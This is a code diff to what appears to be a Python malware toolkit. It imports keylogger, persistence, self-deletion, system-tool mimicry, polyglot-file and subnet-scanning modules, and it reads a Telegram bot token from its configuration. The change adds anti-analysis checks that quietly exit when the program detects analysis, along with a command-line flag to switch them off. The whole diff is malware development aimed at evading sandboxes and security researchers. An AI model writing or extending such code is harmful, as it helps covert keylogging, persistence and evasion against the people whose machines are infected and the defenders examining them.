@@ -13,6 +13,7 @@ from modules.polyglot import create_polyglot
 from modules.keylogger import start_keylogger
 from modules.system import add_persistence, mimic_system_tool, self_delete
 from modules.scanner import scan_subnet
+from modules.anti_analysis import run_anti_analysis_checks
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -34,6 +35,7 @@ def main():
         formatter_class=argparse.RawTextHelpFormatter,
     )
     parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
+    parser.add_argument('--no-anti-analysis', action='store_true', help='Disable anti-analysis checks')
     subparsers = parser.add_subparsers(dest="command", required=True)
 
     # Image Steganography
@@ -113,6 +115,11 @@ def main():
 
     level = logging.DEBUG if args.verbose else logging.INFO
     logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')
+
+    if not args.no_anti_analysis:
+        if run_anti_analysis_checks():
+            logging.warning("Anti-analysis checks failed. Exiting.")
+            sys.exit(0)
 
     tg_config = config.get("telegram", {})
     bot_token = tg_config.get("bot_token")
